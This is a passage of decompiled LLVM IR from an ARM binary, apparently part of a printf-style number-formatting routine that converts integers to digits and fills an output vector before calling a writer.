  %v0_11c4897 = phi i32 [ -1, %dec_label_pc_11bb4 ], [ -1, %dec_label_pc_11bf4 ], [ %v0_11be8, %.thread166 ]
  %v0_11c0c = phi i32 [ 0, %dec_label_pc_11bb4 ], [ %v0_11c0c89, %dec_label_pc_11bf4 ], [ %v2_11b7c, %.thread166 ]
  %v2_11bf8 = load i32, i32* %stack_var_-200, align 4
  store i32 %v2_11bf8, i32* %r2.global-to-local, align 4
  %v1_11bfc = add i32 %v2_11bf8, 12
  %v2_11bfc = inttoptr i32 %v1_11bfc to i32*
  %v3_11bfc = load i32, i32* %v2_11bfc, align 4
  %v1_11c00 = and i32 %v3_11bfc, 16
  store i32 %v1_11c00, i32* @lr, align 4
  %v2_11c00 = icmp eq i32 %v1_11c00, 0
  %tmp283 = zext i1 %v2_11c00 to i32
  %.275 = xor i32 %tmp283, 1
  store i32 %.275, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11c0c = icmp slt i32 %v0_11c0c, 0
  store i1 %v1_11c0c, i1* %cpsr_n.global-to-local, align 1
  %v2_11c0c = icmp eq i32 %v0_11c0c, 0
  store i1 %v2_11c0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11c0c, label %bb263, label %.thread40

.thread40:                                        ; preds = %dec_label_pc_11bf8
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11c2c

bb263:                                            ; preds = %dec_label_pc_11bf8
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_11c00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11c00, label %dec_label_pc_11c1c, label %dec_label_pc_11c2c

dec_label_pc_11c1c:                               ; preds = %bb263
  store i32 %v1_11ca4, i32* %r3.global-to-local, align 4
  %v0_11c20 = load i32, i32* @sl, align 4
  %v1_11c20 = add i32 %v0_11c20, -103
  %v3_11c20 = sub i32 102, %v0_11c20
  %v4_11c20 = and i32 %v3_11c20, %v0_11c20
  %v5_11c20 = icmp slt i32 %v4_11c20, 0
  store i1 %v5_11c20, i1* %cpsr_v.global-to-local, align 1
  %v6_11c20 = icmp slt i32 %v1_11c20, 0
  store i1 %v6_11c20, i1* %cpsr_n.global-to-local, align 1
  %v7_11c20 = icmp eq i32 %v0_11c20, 103
  store i1 %v7_11c20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11c20, label %dec_label_pc_11c48, label %bb264

bb264:                                            ; preds = %dec_label_pc_11c1c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v2_11c24 = icmp slt i32 %v1_11ca4, 0
  store i1 %v2_11c24, i1* %cpsr_n.global-to-local, align 1
  %v3_11c24 = icmp eq i32 %v1_11ca4, 0
  store i1 %v3_11c24, i1* %cpsr_z.global-to-local, align 1
  %tmp265 = icmp slt i32 %v1_11ca4, 1
  br i1 %tmp265, label %dec_label_pc_11c48, label %dec_label_pc_11c2c

dec_label_pc_11c2c:                               ; preds = %.thread40, %bb263, %bb264
  %v2_11c30 = inttoptr i32 %v1_11c30 to i32*
  store i32 112, i32* %v2_11c30, align 4
  %v1_11c38 = load i32, i32* %r6.global-to-local, align 4
  %v2_11c38 = add i32 %v1_11c38, 4
  %v3_11c38 = inttoptr i32 %v2_11c38 to i32*
  store i32 1, i32* %v3_11c38, align 4
  store i32 ptrtoint (i32* @global_var_17bc4.538 to i32), i32* %r3.global-to-local, align 4
  %v1_11c40 = load i32, i32* %r6.global-to-local, align 4
  %v2_11c40 = add i32 %v1_11c40, 8
  %v3_11c40 = inttoptr i32 %v2_11c40 to i32*
  store i32 ptrtoint (i32* @global_var_17bc4.538 to i32), i32* %v3_11c40, align 4
  %v0_11c44 = load i32, i32* %r6.global-to-local, align 4
  %v1_11c44 = add i32 %v0_11c44, 12
  store i32 %v1_11c44, i32* %r6.global-to-local, align 4
  %v0_11c48.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11c48

dec_label_pc_11c48:                               ; preds = %dec_label_pc_11c1c, %bb264, %dec_label_pc_11c2c
  %v1_11c54 = phi i32 [ %v1_11c30, %bb264 ], [ %v1_11c44, %dec_label_pc_11c2c ], [ %v1_11c30, %dec_label_pc_11c1c ]
  %v0_11c48 = phi i32 [ %v0_11c4897, %bb264 ], [ %v0_11c48.pre, %dec_label_pc_11c2c ], [ %v0_11c4897, %dec_label_pc_11c1c ]
  %v1_11c48 = add i32 %v0_11c48, 1
  store i32 %v1_11c48, i32* %ip.global-to-local, align 4
  %v3_11c48 = sub i32 0, %v0_11c48
  %v4_11c48 = and i32 %v1_11c48, %v3_11c48
  %v5_11c48 = icmp slt i32 %v4_11c48, 0
  store i1 %v5_11c48, i1* %cpsr_v.global-to-local, align 1
  %v6_11c48 = icmp slt i32 %v1_11c48, 0
  store i1 %v6_11c48, i1* %cpsr_n.global-to-local, align 1
  %v7_11c48 = icmp eq i32 %v1_11c48, 0
  store i1 %v7_11c48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11c48, label %dec_label_pc_11c6c, label %dec_label_pc_11c50

dec_label_pc_11c50:                               ; preds = %dec_label_pc_11c48
  %v1_11c50 = sub i32 -1, %v0_11c48
  %v2_11c54 = add i32 %v1_11c54, 4
  %v3_11c54 = inttoptr i32 %v2_11c54 to i32*
  store i32 %v1_11c50, i32* %v3_11c54, align 4
  store i32 ptrtoint (i32* @global_var_17bb7.536 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_11c60 = load i32, i32* %r6.global-to-local, align 4
  %v2_11c60 = inttoptr i32 %v1_11c60 to i32*
  store i32 176, i32* %v2_11c60, align 4
  %v0_11c64 = load i32, i32* %r3.global-to-local, align 4
  %v1_11c64 = load i32, i32* %r6.global-to-local, align 4
  %v2_11c64 = add i32 %v1_11c64, 8
  %v3_11c64 = inttoptr i32 %v2_11c64 to i32*
  store i32 %v0_11c64, i32* %v3_11c64, align 4
  %v0_11c68 = load i32, i32* %r6.global-to-local, align 4
  %v1_11c68 = add i32 %v0_11c68, 12
  store i32 %v1_11c68, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11c6c

dec_label_pc_11c6c:                               ; preds = %dec_label_pc_11c48, %dec_label_pc_11c50
  %v2_11c74 = phi i32 [ %v1_11c54, %dec_label_pc_11c48 ], [ %v1_11c68, %dec_label_pc_11c50 ]
  %v0_11c6c = load i32, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11c6c = icmp slt i32 %v0_11c6c, 0
  store i1 %v1_11c6c, i1* %cpsr_n.global-to-local, align 1
  %v2_11c6c = icmp eq i32 %v0_11c6c, 0
  store i1 %v2_11c6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11c6c, label %.thread49, label %bb266

bb266:                                            ; preds = %dec_label_pc_11c6c
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_11c74 = inttoptr i32 %v2_11c74 to i32*
  store i32 112, i32* %v3_11c74, align 4
  %v1_11c78 = load i32, i32* %r4.global-to-local, align 4
  %v2_11c78 = load i32, i32* %r6.global-to-local, align 4
  %v3_11c78 = add i32 %v2_11c78, 8
  %v4_11c78 = inttoptr i32 %v3_11c78 to i32*
  store i32 %v1_11c78, i32* %v4_11c78, align 4
  %v1_11c7c = load i32, i32* %r1.global-to-local, align 4
  %v2_11c7c = load i32, i32* %r6.global-to-local, align 4
  %v3_11c7c = add i32 %v2_11c7c, 4
  %v4_11c7c = inttoptr i32 %v3_11c7c to i32*
  store i32 %v1_11c7c, i32* %v4_11c7c, align 4
  %v1_11c80 = load i32, i32* %r6.global-to-local, align 4
  %v2_11c80 = add i32 %v1_11c80, 12
  store i32 %v2_11c80, i32* %r6.global-to-local, align 4
  br label %.thread49

.thread49:                                        ; preds = %dec_label_pc_11c6c, %bb266
  %v1_11ca8 = phi i32 [ %v2_11c74, %dec_label_pc_11c6c ], [ %v2_11c80, %bb266 ]
  %v0_11c84 = load i32, i32* @sl, align 4
  %v1_11c84 = add i32 %v0_11c84, -103
  %v3_11c84 = sub i32 102, %v0_11c84
  %v4_11c84 = and i32 %v3_11c84, %v0_11c84
  %v5_11c84 = icmp slt i32 %v4_11c84, 0
  store i1 %v5_11c84, i1* %cpsr_v.global-to-local, align 1
  %v6_11c84 = icmp slt i32 %v1_11c84, 0
  store i1 %v6_11c84, i1* %cpsr_n.global-to-local, align 1
  %v7_11c84 = icmp eq i32 %v0_11c84, 103
  store i1 %v7_11c84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11c84, label %dec_label_pc_11c8c, label %dec_label_pc_11c94

dec_label_pc_11c8c:                               ; preds = %.thread49
  %v0_11c8c = load i32, i32* @lr, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11c8c = icmp slt i32 %v0_11c8c, 0
  store i1 %v1_11c8c, i1* %cpsr_n.global-to-local, align 1
  %v2_11c8c = icmp eq i32 %v0_11c8c, 0
  store i1 %v2_11c8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11c8c, label %dec_label_pc_11cc0, label %dec_label_pc_11c94

dec_label_pc_11c94:                               ; preds = %.thread49, %dec_label_pc_11c8c
  %v0_11c94 = load i32, i32* %ip.global-to-local, align 4
  %v1_11c94 = load i32, i32* %r1.global-to-local, align 4
  %v2_11c94 = sub i32 %v1_11c94, %v0_11c94
  store i32 %v2_11c94, i32* %r3.global-to-local, align 4
  store i32 %v1_11ca4, i32* %ip.global-to-local, align 4
  %v2_11c9c = sub i32 %v2_11c94, %v1_11ca4
  %v4_11c9c = xor i32 %v2_11c94, %v1_11ca4
  %v5_11c9c = xor i32 %v2_11c9c, %v2_11c94
  %v6_11c9c = and i32 %v5_11c9c, %v4_11c9c
  %v7_11c9c = icmp slt i32 %v6_11c9c, 0
  store i1 %v7_11c9c, i1* %cpsr_v.global-to-local, align 1
  %v8_11c9c = icmp slt i32 %v2_11c9c, 0
  store i1 %v8_11c9c, i1* %cpsr_n.global-to-local, align 1
  %v9_11c9c = icmp eq i32 %v2_11c94, %v1_11ca4
  store i1 %v9_11c9c, i1* %cpsr_z.global-to-local, align 1
  %v2_11ca0 = xor i1 %v8_11c9c, %v7_11c9c
  br i1 %v2_11ca0, label %dec_label_pc_11ca4, label %dec_label_pc_11cc0

dec_label_pc_11ca4:                               ; preds = %dec_label_pc_11c94
  %v2_11ca4 = sub i32 %v1_11ca4, %v2_11c94
  %v2_11ca8 = add i32 %v1_11ca8, 4
  %v3_11ca8 = inttoptr i32 %v2_11ca8 to i32*
  store i32 %v2_11ca4, i32* %v3_11ca8, align 4
  store i32 ptrtoint (i32* @global_var_17bb7.536 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_11cb4 = load i32, i32* %r6.global-to-local, align 4
  %v2_11cb4 = inttoptr i32 %v1_11cb4 to i32*
  store i32 176, i32* %v2_11cb4, align 4
  %v0_11cb8 = load i32, i32* %r3.global-to-local, align 4
  %v1_11cb8 = load i32, i32* %r6.global-to-local, align 4
  %v2_11cb8 = add i32 %v1_11cb8, 8
  %v3_11cb8 = inttoptr i32 %v2_11cb8 to i32*
  store i32 %v0_11cb8, i32* %v3_11cb8, align 4
  %v0_11cbc = load i32, i32* %r6.global-to-local, align 4
  %v1_11cbc = add i32 %v0_11cbc, 12
  store i32 %v1_11cbc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11cc0

dec_label_pc_11cc0:                               ; preds = %dec_label_pc_11c94, %dec_label_pc_11c8c, %dec_label_pc_11ca4
  %v1_11d54.pre.pre = phi i32 [ %v1_11ca8, %dec_label_pc_11c94 ], [ %v1_11ca8, %dec_label_pc_11c8c ], [ %v1_11cbc, %dec_label_pc_11ca4 ]
  %v0_11cc0 = load i32, i32* %r7.global-to-local, align 4
  %v1_11cc0 = add i32 %v0_11cc0, -102
  %v3_11cc0 = sub i32 101, %v0_11cc0
  %v4_11cc0 = and i32 %v3_11cc0, %v0_11cc0
  %v5_11cc0 = icmp slt i32 %v4_11cc0, 0
  store i1 %v5_11cc0, i1* %cpsr_v.global-to-local, align 1
  %v6_11cc0 = icmp slt i32 %v1_11cc0, 0
  store i1 %v6_11cc0, i1* %cpsr_n.global-to-local, align 1
  %v7_11cc0 = icmp eq i32 %v0_11cc0, 102
  store i1 %v7_11cc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11cc0, label %dec_label_pc_11d48, label %dec_label_pc_11cc8

dec_label_pc_11cc8:                               ; preds = %dec_label_pc_11cc0
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_11ccc = load i32, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11ccc = icmp slt i32 %v0_11ccc, 0
  store i1 %v1_11ccc, i1* %cpsr_n.global-to-local, align 1
  %v2_11ccc = icmp eq i32 %v0_11ccc, 0
  store i1 %v2_11ccc, i1* %cpsr_z.global-to-local, align 1
  store i32 %stack_var_-58.0130137, i32* %r8.global-to-local, align 4
  store i32 0, i32* %stack_var_-43, align 4
  %v4_11ce0 = sub i32 0, %v0_11ccc
  %storemerge179 = select i1 %v1_11ccc, i32 %v4_11ce0, i32 %v0_11ccc
  %tmp284 = ashr i32 %v0_11ccc, 31
  %tmp285 = and i32 %tmp284, 2
  %tmp286 = add nuw nsw i32 %tmp285, 43
  store i32 %storemerge179, i32* %r4.global-to-local, align 4
  store i32 %tmp286, i32* %sl.global-to-local, align 4
  %v2_11ce8 = ptrtoint i32* %stack_var_-43 to i32
  store i32 %v2_11ce8, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11cf0

dec_label_pc_11cf0:                               ; preds = %dec_label_pc_11d20, %dec_label_pc_11cf0, %dec_label_pc_11cc8
  %v0_11cf0 = phi i32 [ %storemerge179, %dec_label_pc_11cc8 ], [ %v0_11d0c, %dec_label_pc_11cf0 ], [ %v0_11d0c, %dec_label_pc_11d20 ]
  store i32 %v0_11cf0, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_11cf8 = call i32 @function_c930(i32 %v0_11cf0, i32 10)
  %v1_11cfc = add i32 %v2_11cf8, 48
  store i32 %v1_11cfc, i32* %r3.global-to-local, align 4
  store i32 10, i32* @r1, align 4
  %v0_11d04 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11d04, i32* @r0, align 4
  %v1_11d08 = trunc i32 %v1_11cfc to i8
  %v2_11d08 = load i32, i32* %r5.global-to-local, align 4
  %v3_11d08 = add i32 %v2_11d08, -1
  %v4_11d08 = inttoptr i32 %v3_11d08 to i8*
  store i8 %v1_11d08, i8* %v4_11d08, align 1
  %v5_11d08 = load i32, i32* %r5.global-to-local, align 4
  %v6_11d08 = add i32 %v5_11d08, -1
  store i32 %v6_11d08, i32* %r5.global-to-local, align 4
  %v0_11d0c = call i32 @function_14b44()
  store i32 %v0_11d0c, i32* %r0.global-to-local, align 4
  %v0_11d10 = load i32, i32* %r7.global-to-local, align 4
  %v1_11d10 = add i32 %v0_11d10, 1
  store i32 %v1_11d10, i32* %r7.global-to-local, align 4
  %v1_11d14 = add i32 %v0_11d10, -2
  %v3_11d14 = sub i32 1, %v0_11d10
  %v4_11d14 = and i32 %v3_11d14, %v1_11d10
  %v5_11d14 = icmp slt i32 %v4_11d14, 0
  store i1 %v5_11d14, i1* %cpsr_v.global-to-local, align 1
  %v6_11d14 = icmp slt i32 %v1_11d14, 0
  store i1 %v6_11d14, i1* %cpsr_n.global-to-local, align 1
  %v7_11d14 = icmp eq i32 %v1_11d10, 3
  store i1 %v7_11d14, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_11d0c, i32* %r4.global-to-local, align 4
  %v7_11d1c = icmp slt i32 %v1_11d10, 4
  br i1 %v7_11d1c, label %dec_label_pc_11cf0, label %dec_label_pc_11d20

dec_label_pc_11d20:                               ; preds = %dec_label_pc_11cf0
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11d20 = icmp slt i32 %v0_11d0c, 0
  store i1 %v1_11d20, i1* %cpsr_n.global-to-local, align 1
  %v2_11d20 = icmp eq i32 %v0_11d0c, 0
  store i1 %v2_11d20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11d20, label %dec_label_pc_11d28, label %dec_label_pc_11cf0

dec_label_pc_11d28:                               ; preds = %dec_label_pc_11d20
  %v0_11d28 = load i32, i32* %r5.global-to-local, align 4
  %v1_11d28 = add i32 %v0_11d28, -1
  store i32 %v1_11d28, i32* %r3.global-to-local, align 4
  %v0_11d2c = load i32, i32* %sl.global-to-local, align 4
  %v1_11d2c = trunc i32 %v0_11d2c to i8
  %v4_11d2c = inttoptr i32 %v1_11d28 to i8*
  store i8 %v1_11d2c, i8* %v4_11d2c, align 1
  %v0_11d30 = load i32, i32* %r3.global-to-local, align 4
  %v1_11d30 = add i32 %v0_11d30, -1
  store i32 %v1_11d30, i32* %r2.global-to-local, align 4
  %v0_11d34 = load i32, i32* %r8.global-to-local, align 4
  %v1_11d34 = trunc i32 %v0_11d34 to i8
  %v4_11d34 = inttoptr i32 %v1_11d30 to i8*
  store i8 %v1_11d34, i8* %v4_11d34, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_11d3c = load i32, i32* %r6.global-to-local, align 4
  %v1_11d3c = inttoptr i32 %v0_11d3c to i32*
  store i32 112, i32* %v1_11d3c, align 4
  %v3_11d3c = add i32 %v0_11d3c, 4
  %v4_11d3c = inttoptr i32 %v3_11d3c to i32*
  %v5_11d3c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_11d3c, i32* %v4_11d3c, align 4
  %v0_11d40 = load i32, i32* %r2.global-to-local, align 4
  %v1_11d40 = load i32, i32* %r6.global-to-local, align 4
  %v2_11d40 = add i32 %v1_11d40, 8
  %v3_11d40 = inttoptr i32 %v2_11d40 to i32*
  store i32 %v0_11d40, i32* %v3_11d40, align 4
  %v0_11d44 = load i32, i32* %r6.global-to-local, align 4
  %v1_11d44 = add i32 %v0_11d44, 12
  store i32 %v1_11d44, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11d48

dec_label_pc_11d48:                               ; preds = %dec_label_pc_11cc0, %.thread121, %dec_label_pc_11d28
  %v1_11d54.pre = phi i32 [ %v2_11800, %.thread121 ], [ %v1_11d44, %dec_label_pc_11d28 ], [ %v1_11d54.pre.pre, %dec_label_pc_11cc0 ]
  %v2_11d48 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_11d48, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11d4c

dec_label_pc_11d4c:                               ; preds = %dec_label_pc_11d4c, %dec_label_pc_11d48
  %v0_11d4c = phi i32 [ %v2_11d48, %dec_label_pc_11d48 ], [ %v4_11d4c, %dec_label_pc_11d4c ]
  %stack_var_-188.0 = phi i32 [ %v3_116b0, %dec_label_pc_11d48 ], [ %v2_11d58, %dec_label_pc_11d4c ]
  %v1_11d4c = inttoptr i32 %v0_11d4c to i32*
  %v2_11d4c = load i32, i32* %v1_11d4c, align 4
  store i32 %v2_11d4c, i32* %r3.global-to-local, align 4
  %v4_11d4c = add i32 %v0_11d4c, 12
  store i32 %v4_11d4c, i32* %r2.global-to-local, align 4
  %v3_11d54 = icmp ult i32 %v4_11d4c, %v1_11d54.pre
  %v2_11d58 = sub i32 %stack_var_-188.0, %v2_11d4c
  store i32 %v2_11d58, i32* %r0.global-to-local, align 4
  br i1 %v3_11d54, label %dec_label_pc_11d4c, label %dec_label_pc_11d64

dec_label_pc_11d64:                               ; preds = %dec_label_pc_11d4c
  %v3_11d64 = load i8, i8* %stack_var_-42, align 1
  %v4_11d64 = sext i8 %v3_11d64 to i32
  store i32 %v4_11d64, i32* %r3.global-to-local, align 4
  store i32 %v4_11d64, i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11d68 = icmp slt i8 %v3_11d64, 0
  store i1 %v1_11d68, i1* %cpsr_n.global-to-local, align 1
  %v2_11d68 = icmp eq i8 %v3_11d64, 0
  store i1 %v2_11d68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11d68, label %bb271, label %bb270

bb270:                                            ; preds = %dec_label_pc_11d64
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb271

bb271:                                            ; preds = %dec_label_pc_11d64, %bb270
  %v1_11dbc = phi i32 [ %v4_11d64, %dec_label_pc_11d64 ], [ 1, %bb270 ]
  %v2_11d70 = sub i32 %v2_11d58, %v1_11dbc
  store i32 %v2_11d70, i32* %r1.global-to-local, align 4
  %v2_11d74 = ptrtoint i8* %stack_var_-42 to i32
  store i32 %v2_11d74, i32* %r3.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11d7c = icmp slt i32 %v2_11d70, 0
  store i1 %v1_11d7c, i1* %cpsr_n.global-to-local, align 1
  %v2_11d7c = icmp eq i32 %v2_11d70, 0
  store i1 %v2_11d7c, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-176, align 4
  %tmp272 = icmp slt i32 %v2_11d70, 1
  br i1 %tmp272, label %dec_label_pc_11de4, label %dec_label_pc_11d90

dec_label_pc_11d90:                               ; preds = %bb271
  %v2_11d90 = load i32, i32* %stack_var_-200, align 4
  store i32 %v2_11d90, i32* %ip.global-to-local, align 4
  %v1_11d94 = add i32 %v2_11d90, 12
  %v2_11d94 = inttoptr i32 %v1_11d94 to i32*
  %v3_11d94 = load i32, i32* %v2_11d94, align 4
  store i32 %v3_11d94, i32* %r3.global-to-local, align 4
  %v1_11d98 = and i32 %v3_11d94, 8
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_11d98 = icmp eq i32 %v1_11d98, 0
  store i1 %v2_11d98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11d98, label %dec_label_pc_11db0, label %dec_label_pc_11da0

dec_label_pc_11da0:                               ; preds = %dec_label_pc_11d90
  store i32 ptrtoint (i32* @global_var_17bb7.536 to i32), i32* %r3.global-to-local, align 4
  %v1_11da4 = add i32 %v1_11d54.pre, 12
  store i32 %v1_11da4, i32* %r5.global-to-local, align 4
  %v1_11da8 = inttoptr i32 %v1_11d54.pre to i32*
  store i32 160, i32* %v1_11da8, align 4
  %v3_11da8 = add i32 %v1_11d54.pre, 4
  %v4_11da8 = inttoptr i32 %v3_11da8 to i32*
  %v5_11da8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_11da8, i32* %v4_11da8, align 4
  %v6_11da8 = add i32 %v1_11d54.pre, 8
  %v7_11da8 = inttoptr i32 %v6_11da8 to i32*
  %v8_11da8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_11da8, i32* %v7_11da8, align 4
  br label %dec_label_pc_11de8

dec_label_pc_11db0:                               ; preds = %dec_label_pc_11d90
  store i32 %v2_11d90, i32* %r0.global-to-local, align 4
  %v1_11db4 = add i32 %v2_11d90, 16
  %v2_11db4 = inttoptr i32 %v1_11db4 to i32*
  %v3_11db4 = load i32, i32* %v2_11db4, align 4
  store i32 %v3_11db4, i32* %r3.global-to-local, align 4
  %v1_11db8 = add i32 %v3_11db4, -48
  %v3_11db8 = sub i32 47, %v3_11db4
  %v4_11db8 = and i32 %v3_11db8, %v3_11db4
  %v5_11db8 = icmp slt i32 %v4_11db8, 0
  store i1 %v5_11db8, i1* %cpsr_v.global-to-local, align 1
  %v6_11db8 = icmp slt i32 %v1_11db8, 0
  store i1 %v6_11db8, i1* %cpsr_n.global-to-local, align 1
  %v7_11db8 = icmp eq i32 %v3_11db4, 48
  store i1 %v7_11db8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11db8, label %dec_label_pc_11dc8, label %bb273

bb273:                                            ; preds = %dec_label_pc_11db0
  store i32 %v2_11d58, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11de4

dec_label_pc_11dc8:                               ; preds = %dec_label_pc_11db0
  %v3_11dc8 = load i32, i32* %stack_var_-160, align 4
  store i32 %v1_11d54.pre, i32* %r5.global-to-local, align 4
  %v2_11dd0 = add i32 %v3_11dc8, %v2_11d70
  store i32 %v2_11dd0, i32* %r3.global-to-local, align 4
  store i32 %v2_11dd0, i32* %stack_var_-160, align 4
  br label %dec_label_pc_11de8

dec_label_pc_11ddc:                               ; preds = %dec_label_pc_11df0
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11e20

dec_label_pc_11de4:                               ; preds = %bb273, %bb271
  store i32 %v1_11d54.pre, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11de8

dec_label_pc_11de8:                               ; preds = %dec_label_pc_11dc8, %dec_label_pc_11da0, %dec_label_pc_11de4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_11dec = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_11dec, i32* %r4.global-to-local, align 4
  %v3_11df8.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_11df0

dec_label_pc_11df0:                               ; preds = %dec_label_pc_11e18, %dec_label_pc_11de8
  %v0_11df0 = phi i32 [ %v1_11e10, %dec_label_pc_11e18 ], [ %v2_11dec, %dec_label_pc_11de8 ]
  %v1_11df0 = inttoptr i32 %v0_11df0 to i32*
  %v2_11df0 = load i32, i32* %v1_11df0, align 4
  store i32 %v2_11df0, i32* %r1.global-to-local, align 4
  %v3_11df0 = add i32 %v0_11df0, 4
  %v4_11df0 = inttoptr i32 %v3_11df0 to i32*
  %v5_11df0 = load i32, i32* %v4_11df0, align 4
  store i32 %v5_11df0, i32* %r2.global-to-local, align 4
  %v6_11df0 = add i32 %v0_11df0, 8
  %v7_11df0 = inttoptr i32 %v6_11df0 to i32*
  %v8_11df0 = load i32, i32* %v7_11df0, align 4
  store i32 %v8_11df0, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %v3_11df8.pre, i32* @ip, align 4
  store i32 73220, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_11df8.pre)
  %v0_11e04 = load i32, i32* %r4.global-to-local, align 4
  %v1_11e04 = add i32 %v0_11e04, 4
  %v2_11e04 = inttoptr i32 %v1_11e04 to i32*
  %v3_11e04 = load i32, i32* %v2_11e04, align 4
  store i32 %v3_11e04, i32* %r3.global-to-local, align 4
  %v0_11e08 = load i32, i32* %r0.global-to-local, align 4
  %v2_11e08 = sub i32 %v0_11e08, %v3_11e04
  %v4_11e08 = xor i32 %v0_11e08, %v3_11e04
  %v5_11e08 = xor i32 %v2_11e08, %v0_11e08
  %v6_11e08 = and i32 %v5_11e08, %v4_11e08
  %v7_11e08 = icmp slt i32 %v6_11e08, 0
  store i1 %v7_11e08, i1* %cpsr_v.global-to-local, align 1
  %v8_11e08 = icmp slt i32 %v2_11e08, 0
  store i1 %v8_11e08, i1* %cpsr_n.global-to-local, align 1
  %v9_11e08 = icmp eq i32 %v0_11e08, %v3_11e04
  store i1 %v9_11e08, i1* %cpsr_z.global-to-local, align 1
  %v0_11e0c = load i32, i32* %r6.global-to-local, align 4
  %v2_11e0c = add i32 %v0_11e0c, %v0_11e08
  store i32 %v2_11e0c, i32* %r6.global-to-local, align 4
  %v1_11e10 = add i32 %v0_11e04, 12
  store i32 %v1_11e10, i32* %r4.global-to-local, align 4
  br i1 %v9_11e08, label %dec_label_pc_11e18, label %dec_label_pc_11ddc

dec_label_pc_11e18:                               ; preds = %dec_label_pc_11df0
  %v1_11e18 = load i32, i32* %r5.global-to-local, align 4
  %v2_11e18 = sub i32 %v1_11e10, %v1_11e18
  %v3_11e18 = icmp ult i32 %v1_11e10, %v1_11e18
  %v4_11e18 = xor i32 %v1_11e18, %v1_11e10
  %v5_11e18 = xor i32 %v2_11e18, %v1_11e10
  %v6_11e18 = and i32 %v5_11e18, %v4_11e18
  %v7_11e18 = icmp slt i32 %v6_11e18, 0
  store i1 %v7_11e18, i1* %cpsr_v.global-to-local, align 1
  %v8_11e18 = icmp slt i32 %v2_11e18, 0
  store i1 %v8_11e18, i1* %cpsr_n.global-to-local, align 1
  %v9_11e18 = icmp eq i32 %v1_11e10, %v1_11e18
  store i1 %v9_11e18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11e18, label %dec_label_pc_11df0, label %dec_label_pc_11e20

dec_label_pc_11e20:                               ; preds = %dec_label_pc_11e18, %dec_label_pc_11ddc
  %v0_11e20 = phi i32 [ -1, %dec_label_pc_11ddc ], [ %v2_11e0c, %dec_label_pc_11e18 ]
  store i32 %v0_11e20, i32* %r0.global-to-local, align 4
  %v2_11e28 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_11e28, i32* %r4.global-to-local, align 4
  store i32 %v6_11660, i32* @r5, align 4
  store i32 %v9_11660, i32* @r6, align 4
  store i32 %v12_11660, i32* @r7, align 4
  store i32 %v15_11660, i32* @r8, align 4
  store i32 %v18_11660, i32* @sb, align 4
  store i32 %v21_11660, i32* @sl, align 4
  ret i32 %v0_11e20

; uselistorder directives
  uselistorder i32 %v0_11e20, { 1, 0 }
  uselistorder i32 %v2_11e18, { 1, 0 }
  uselistorder i32 %v1_11e18, { 2, 0, 1, 3 }
  uselistorder i32 %v1_11e10, { 4, 0, 1, 5, 3, 6, 2 }
  uselistorder i32 %v2_11e08, { 1, 0 }
  uselistorder i32 %v0_11e08, { 0, 3, 1, 2, 4 }
